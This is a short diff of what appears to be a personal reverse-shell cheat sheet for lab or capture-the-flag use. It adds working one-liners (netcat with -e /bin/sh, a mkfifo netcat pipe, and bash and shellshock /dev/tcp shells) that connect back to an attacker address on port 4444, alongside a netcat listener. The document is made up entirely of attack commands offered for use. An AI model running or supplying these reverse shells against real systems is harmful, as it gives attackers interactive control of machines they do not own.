@@ -5,12 +5,22 @@ Netcat Listener:
 nc -lvnp 4444
 
 
+NC reverse shell:
+nc -e /bin/sh 10.10.14.16 4444
+
+
+
+from OpenBSD Netcat:
+mkfifo f; nc 10.10.14.16 4444 0<f | /bin/sh -i 2>&1 | tee f
+
+
 
 
 Target box:
 
 With bash:
 (seen with sqlmap)
-bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'
+bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'
 
-
+in shellshock:
+/bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1
